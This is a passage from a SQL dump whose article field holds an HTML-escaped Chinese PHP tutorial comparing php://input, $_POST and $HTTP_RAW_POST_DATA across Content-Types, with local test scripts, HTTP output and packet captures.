color=&quot;#ff0000&quot;&gt;&quot;-------&lt;span&gt;\\$&lt;/span&gt;_GET------------------&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;a href=&quot;http://www.php.net/var_dump&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;var_dump&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$_GET&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;-------php://input-------------&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;$raw_post_data&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;?&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;br /&gt;\r\n&lt;span&gt;&lt;strong&gt;&amp;lt;?php&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#808080&quot;&gt;//@file phpinput_get.php&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$query_path&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''n=''&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;a href=&quot;http://www.php.net/urldecode&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;urldecode&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''perfgeeks''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;span&gt;''&amp;amp;amp;p=''&lt;/span&gt; &lt;span&gt;.&lt;/span&gt; &lt;a href=&quot;http://www.php.net/urldecode&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;urldecode&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''7788''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$host&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''192.168.0.6''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$port&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff33ff&quot;&gt;80&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$path&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''/phpinput_server.php''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$d&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;''''&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$fp&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/fsockopen&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fsockopen&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$host&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$port&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$error_no&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;$error_desc&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; 30&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;if&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;{&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;GET &lt;span&gt;{$path}&lt;/span&gt;?&lt;span&gt;{$query_path}&lt;/span&gt; HTTP/1.1&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Host: &lt;span&gt;{$host}&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fputs&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fputs&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;Connection: close&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&lt;span&gt;\\r&lt;/span&gt;&lt;span&gt;\\n&lt;/span&gt;&quot;&lt;/font&gt;&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;while&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;a href=&quot;http://www.php.net/feof&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;feof&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;font color=&quot;#66cc66&quot;&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/font&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;{&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;$d&lt;/span&gt; &lt;span&gt;.=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/fgets&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fgets&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; 4096&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;}&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/fclose&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;fclose&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$fp&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;$d&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;}&lt;/font&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt; &lt;p&gt;同样，我们执行下一phpinput_get.php测试脚本，它模拟了一个通常情况下的GET方法提交表单数据。&lt;/p&gt;\r\n &lt;div&gt; &lt;pre&gt;&lt;span&gt;@&lt;/span&gt;php &lt;span&gt;/&lt;/span&gt;phpinput_get.php&lt;/pre&gt; &lt;/div&gt;\r\n &lt;pre&gt;HTTP/1.1 200 OK&lt;br /&gt;\r\nDate: Thu, 08 Apr 2010 07:38:15 GMT&lt;br /&gt;\r\nServer: Apache/2.2.3 (CentOS)&lt;br /&gt;\r\nX-Powered-By: PHP/5.1.6&lt;br /&gt;\r\nContent-Length: 141&lt;br /&gt;\r\nConnection: close&lt;br /&gt;\r\nContent-Type: text/html; charset=UTF-8&lt;br /&gt;\r\n&lt;br /&gt;\r\n-------$_GET------------------&lt;br /&gt;\r\narray(2) {&lt;br /&gt;\r\n [&quot;n&quot;]=&amp;gt;&lt;br /&gt;\r\n string(9) &quot;perfgeeks&quot;&lt;br /&gt;\r\n [&quot;p&quot;]=&amp;gt;&lt;br /&gt;\r\n string(4) &quot;7788&quot;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n-------php://input-------------&lt;/pre&gt; &lt;p&gt;在这个时候，使用ngrep工具，捕获的相应的http请求数据包如下&lt;/p&gt;\r\n &lt;pre&gt;T 192.168.0.8:36775 -&amp;gt; 192.168.0.6:80 [AP]&lt;br /&gt;\r\n &lt;strong&gt;GET&lt;/strong&gt; /phpinput_server.php?&lt;strong&gt;n=perfgeeks&amp;amp;p=7788&lt;/strong&gt; HTTP/1.1..&lt;br /&gt;\r\n Host: 192.168.0.6..Connection: close....&lt;/pre&gt; &lt;p&gt;比较POST方法提交的http请求，通常GET方法提交的请求中，entity body为空。同时，不会指定Content-Type和Content-Length。但是，如果强硬数据http entity body，并指明正确地Content-Type和Content-Length,那么php://input还可是读取得到http entity body数据，但不是$_GET数据。&lt;/p&gt;\r\n &lt;p&gt;所根据，上面几个探测，我们可以作出以下总结:&lt;br /&gt;\r\n 1，Content-Type取值为application/x-www-form-urlencoded时，php会将http请求body相应数据会 填入到数组$_POST，填入到$_POST数组中的数据是进行urldecode()解析的结果。（其实，除了该Content-Type，还有 multipart/form-data表示数据是表单数据，稍后我们介绍）&lt;br /&gt;\r\n 2，php://input数据，只要Content-Type不为multipart/form-data(该条件限制稍后会介绍)。那么php: //input数据与http entity body部分数据是一致的。该部分相一致的数据的长度由Content-Length指定。&lt;br /&gt;\r\n 3，仅当Content-Type为application/x-www-form-urlencoded且提交方法是POST方法时，$_POST数据 与php://input数据才是”一致”（打上引号，表示它们格式不一致，内容一致）的。其它情况，它们都不一致。&lt;br /&gt;\r\n 4，php://input读取不到$_GET数据。是因为$_GET数据作为query_path写在http请求头部(header)的PATH字 段，而不是写在http请求的body部分。&lt;/p&gt;\r\n &lt;p&gt;这也帮助我们理解了，为什么xml_rpc服务端读取数据都是通过file_get_contents(‘php://input’, ‘r’)。而不是从$_POST中读取，正是因为xml_rpc数据规格是xml，它的Content-Type是text/xml。&lt;/p&gt;\r\n &lt;h3&gt;php://input碰到了multipart/form-data&lt;/h3&gt;\r\n &lt;p&gt;上传文件的时候，表单的写法是这样的&lt;/p&gt;\r\n &lt;pre&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&amp;lt;&lt;a href=&quot;http://december.com/html/4/element/form.html&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;form&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;enctype&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;multipart/form-data&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;action&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;phpinput_server.php&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;method&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;POST&quot;&lt;/font&gt;&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&amp;lt;&lt;a href=&quot;http://december.com/html/4/element/input.html&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;input&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;type&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;text&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;name&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;n&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;/&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&amp;lt;&lt;a href=&quot;http://december.com/html/4/element/input.html&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;input&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;type&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;file&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;name&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;f&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;/&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span&gt;&amp;lt;&lt;a href=&quot;http://december.com/html/4/element/input.html&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;input&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;type&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;submit&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;value&lt;/font&gt;&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#ff0000&quot;&gt;&quot;upload now&quot;&lt;/font&gt;&lt;/span&gt; &lt;span&gt;/&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&amp;lt;&lt;span&gt;/&lt;/span&gt;&lt;a href=&quot;http://december.com/html/4/element/form.html&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;font color=&quot;#000000&quot;&gt;form&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt; &lt;p&gt;那么，enctype=multipart/form-data这里的意义，就是将该次http请求头部(head)中的Content-Type 设置为multipart/form-data。请查阅&lt;a href=&quot;http://www.ietf.org/rfc/rfc1867.txt&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;RFC1867&lt;/font&gt;&lt;/a&gt;对它的描述。multipart/form-data也表示以POST方法提交 表单数据，它还伴随了文件上传，所以会跟application/x-www-form-urlencoded数据格式不一样。它会以一更种更合理的，更 高效的数据格式传递给服务端。我们提交该表单数据，并且打印出响应结果，如下:&lt;/p&gt;\r\n &lt;pre&gt;-------$_POST------------------&lt;br /&gt;\r\narray(1) { [&quot;n&quot;]=&amp;gt; string(9) &quot;perfgeeks&quot; }&lt;br /&gt;\r\n-------php://input-------------&lt;/pre&gt; &lt;p&gt;同时，我们通过ngrep抓取的相应的http请求数据包如下:&lt;/p&gt;\r\n &lt;pre&gt;########&lt;br /&gt;\r\nT 192.168.0.8:3981 -&amp;gt; 192.168.0.6:80 [AP]&lt;br /&gt;\r\n &lt;strong&gt; POST&lt;/strong&gt; /phpinput_server.php HTTP/1.1..Host: 192.168.0.6..Connection: kee&lt;br /&gt;\r\n p-alive..User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) A&lt;br /&gt;\r\n ppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2..Re&lt;br /&gt;\r\n ferer: http://192.168.0.6/phpinput_server.php..Content-Length: 306..Ca&lt;br /&gt;\r\n che-Control: max-age=0..Origin: http://192.168.0.6..&lt;strong&gt;Content-Type: mult&lt;br /&gt;\r\n ipart/form-data; boundary=----WebKitFormBoundarybLQwkp4opIEZn1fA&lt;/strong&gt;..Acce&lt;br /&gt;\r\n pt: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q&lt;br /&gt;\r\n =0.8,image/png,*/*;q=0.5..Accept-Encoding: gzip,deflate,sdch..Accept-L&lt;br /&gt;\r\n anguage: zh-CN,zh;q=0.8..Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3..Cook&lt;br /&gt;\r\n ie: SESS3b0e658f87cf58240de13ab43a399df6=lju6o5bg8u04lv1ojugm2ccic6...&lt;br /&gt;\r\n .&lt;br /&gt;\r\n##&lt;br /&gt;\r\nT 192.168.0.8:3981 -&amp;gt; 192.168.0.6:80 [AP]&lt;br /&gt;\r\n ------WebKitFormBoundarybLQwkp4opIEZn1fA..Content-Disposition: form-da&lt;br /&gt;\r\n ta; &lt;strong&gt;name=&quot;n&quot;....perfgeeks&lt;/strong&gt;..------WebKitFormBoundarybLQwkp4opIEZn1fA..C&lt;br /&gt;\r\n ontent-Disposition: form-data; &lt;strong&gt;name=&quot;f&quot;; filename=&quot;test.txt&quot;..Content-&lt;br /&gt;\r\n Type: text/plain....i am file&lt;/strong&gt;..multipart/form-data..------WebKitFormBo&lt;br /&gt;\r\n undarybLQwkp4opIEZn1fA--..&lt;br /&gt;\r\n##&lt;/pre&gt; &lt;p&gt;从响应输出来比对，$_POST数据跟请求提交数据相符，即$_POST = array(‘n’ =&amp;gt; ‘perfgeeks’)。这也跟http请求body中的数据相呼应，同时说明PHP把相应的数据填入$_POST全局变量。而php://input 输出为空，没有输出任何东西，尽管http请求数据包中body不为空。这表示，当Content-Type为multipart/form-data的 时候，即便http请求body中存在数据，php://input也为空，PHP此时，不会把数据填入php://input流。所以，可以确定: php://input不能用于读取enctype=multipart/form-data数据。&lt;/p&gt;\r\n &lt;p&gt;我们再比较这次通过ngrep抓取的http请求数据包，我们会发现，最大不同的一点是Content-Type后面跟了boundary定义了数 据的分界符，bounday是随机生成的。另外一个大不一样的，就是http entity body中的数据组织结构不一样了。&lt;/p&gt;\r\n &lt;p&gt;上一节，我们概述了，当Content-Type为application/x-www-form-urlencoded时，php: //input和$_POST数据是“一致”的，为其它Content-Type的时候，php://input和$_POST数据数据是不一致的。因为 只有在Content-Type为application/x-www-form-urlencoded或者为multipart/form-data的 时候，PHP才会将http请求数据包中的body相应部分数据填入$_POST全局变量中,其它情况PHP都忽略。而php://input除了在数据 类型为multipart/form-data之外为空外，其它情况都可能不为空。通过这一节，我们更加明白了php://input与$_POST的区 别与联系。所以，再次确认，php://input无法读取enctype=multipart/form-data数据，当php://input遇到 它时，永远为空，即便http entity body有数据。&lt;/p&gt;\r\n &lt;h2&gt;php://input VS $http_raw_post_data&lt;/h2&gt;\r\n &lt;p&gt;相信大家对php://input已经有一定深度地了解了。那么$http_raw_post_data是什么 呢？$http_raw_post_data是PHP内置的一个全局变量。它用于，PHP在无法识别的Content-Type的情况下，将POST过来 的数据原样地填入变量$http_raw_post_data。它同样无法读取Content-Type为multipart/form-data的 POST数据。需要设置php.ini中的always_populate_raw_post_data值为On，PHP才会总把POST数据填入变 量$http_raw_post_data。&lt;/p&gt;\r\n &lt;p&gt;把脚本phpinput_server.php改变一下，可以验证上述内容&lt;/p&gt;\r\n &lt;pre&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;?php&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$raw_post_data&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;a href=&quot;http://www.php.net/file_get_contents&quot;&gt;&lt;span&gt;&lt;font color=&quot;#000066&quot;&gt;file_get_contents&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;''php://input''&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;''r''&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;$rtn&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;(&lt;/font&gt;&lt;/span&gt;&lt;span&gt;$raw_post_data&lt;/span&gt; &lt;span&gt;==&lt;/span&gt; &lt;span&gt;$HTTP_RAW_POST_DATA&lt;/span&gt;&lt;span&gt;&lt;font color=&quot;#66cc66&quot;&gt;)&lt;/font&gt;&lt;/span&gt; ? 1 &lt;span&gt;:&lt;/span&gt; &lt;span&gt;&lt;font color=&quot;#ff33ff&quot;&gt;0&lt;/font&gt;&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;&lt;font color=&quot;#a1a100&quot;&gt;echo&lt;/font&gt;&lt;/span&gt; &lt;span&gt;$rtn&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt; &lt;p&gt;执行测试脚本&lt;/p&gt;\r\n &lt;div&gt; &lt;pre&gt;&lt;span&gt;@&lt;/span&gt;php phpinput_post.php&lt;br /&gt;\r\n&lt;span&gt;@&lt;/span&gt;php phpinput_get.php&lt;br /&gt;\r\n&lt;span&gt;@&lt;/span&gt;php phpinput_xmlrpc.php&lt;/pre&gt; &lt;/div&gt;\r\n &lt;p&gt;得出的结果输出都是一样的，即都为1，表示php://input和$HTTP_RAW_POST_DATA是相同的。至于对内存的压力，我们这里 就不做细致地测试了。有兴趣的，可以通过xhprof进行测试和观察。&lt;/p&gt;\r\n &lt;p&gt;以此，我们这节可以总结如下:&lt;br /&gt;\r\n 1, php://input 可以读取http entity body中指定长度的值,由Content-Length指定长度,不管是POST方式或者GET方法提交过来的数据。但是，一般GET方法提交数据 时，http request entity body部分都为空。&lt;br /&gt;\r\n 2,php://input 与$HTTP_RAW_POST_DATA读取的数据是一样的，都只读取Content-Type不为multipart/form-data的数据。&lt;/p&gt;\r\n &lt;h3&gt;学习笔记&lt;/h3&gt;\r\n &lt;p&gt;1，Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form- data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST&lt;br /&gt;\r\n 2，PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量$HTTP_RAW_POST_DATA&lt;br /&gt;\r\n 3, 只有Coentent-Type不为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php: //input，否则其它情况都会。填入的长度，由Coentent-Length指定。&lt;br /&gt;\r\n 4，只有Content-Type为application/x-www-data-urlencoded时，php://input数据才 跟$_POST数据相一致。&lt;br /&gt;\r\n 5，php://input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input 比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini&lt;br /&gt;\r\n 6，PHP会将PATH字段的query_path部分，填入全局变量$_GET。通常情况下，GET方法提交的http请求，body为空。&lt;/p&gt;\r\n &lt;p&gt;延伸阅读&lt;br /&gt;\r\n 1，&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616.html&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;HTTP1.1 Protocols &lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n 2，&lt;a href=&quot;http://www.w3schools.com/media/media_mimeref.asp&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;Media Reference&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n 3，&lt;a href=&quot;http://en.wikipedia.org/wiki/MIME&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;Wiki MIME&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n 4，&lt;a href=&quot;http://php.net/manual/en/wrappers.php.php&quot;&gt;&lt;font color=&quot;#0066cc&quot;&gt;PHP Stream Wrappers&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n &lt;/div&gt;\r\n &lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1305619759, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
